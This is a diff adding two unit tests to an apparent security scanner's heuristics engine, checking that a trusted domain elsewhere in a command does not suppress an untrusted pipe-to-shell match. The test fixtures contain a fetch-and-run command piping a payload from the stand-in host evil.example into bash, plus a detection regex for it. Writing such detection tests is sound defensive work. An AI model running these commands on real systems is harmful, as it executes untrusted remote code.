@@ -62,6 +62,44 @@ describe("HeuristicsEngine", () => {
 		expect(engine.match(artifacts)).toHaveLength(0);
 	});
 
+	it("does not suppress an untrusted pipe-to-shell match when a trusted URL appears elsewhere", () => {
+		const threat = makeThreat({
+			id: "CLT-CMD-001",
+			pattern: "curl.*\\|.*bash",
+			compiledPattern: /curl.*\|.*bash/,
+		});
+		const trusted: TrustedDomain[] = [{ domain: "bun.sh", reason: "Bun" }];
+		const engine = new HeuristicsEngine([threat], trusted);
+		const artifacts: Artifact[] = [
+			{
+				type: "command",
+				value: "echo https://bun.sh/install && curl https://evil.example/payload.sh | bash",
+			},
+		];
+		const matches = engine.match(artifacts);
+		expect(matches).toHaveLength(1);
+		expect(matches[0]?.artifact).toContain("evil.example");
+	});
+
+	it("does not suppress when trusted and untrusted pipe-to-shell appear in one command", () => {
+		const threat = makeThreat({
+			id: "CLT-CMD-001",
+			pattern: "curl.*\\|.*bash",
+			compiledPattern: /curl.*\|.*bash/,
+		});
+		const trusted: TrustedDomain[] = [{ domain: "bun.sh", reason: "Bun" }];
+		const engine = new HeuristicsEngine([threat], trusted);
+		const artifacts: Artifact[] = [
+			{
+				type: "command",
+				value: "curl https://bun.sh/install | bash; curl https://evil.example/payload.sh | bash",
+			},
+		];
+		const matches = engine.match(artifacts);
+		expect(matches).toHaveLength(1);
+		expect(matches[0]?.artifact).toContain("evil.example");
+	});
+
 	it("suppresses CLT-SUPPLY-001 for trusted domain matches", () => {
 		const threat = makeThreat({
 			id: "CLT-SUPPLY-001",
